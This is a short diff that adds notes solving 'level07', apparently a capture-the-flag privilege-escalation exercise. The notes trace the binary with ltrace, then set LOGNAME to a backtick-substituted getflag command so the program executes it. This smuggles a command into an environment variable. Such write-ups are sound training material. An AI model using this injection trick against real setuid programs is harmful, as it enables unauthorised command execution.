@@ -1,0 +1,5 @@
+# Check executable with ltrace or binry ninja
+ltrace ./level07
+# Notice that the program gives LOGNAME as output
+# Change LOGNAME with getflag command
+export LOGNAME=\`getflag\`
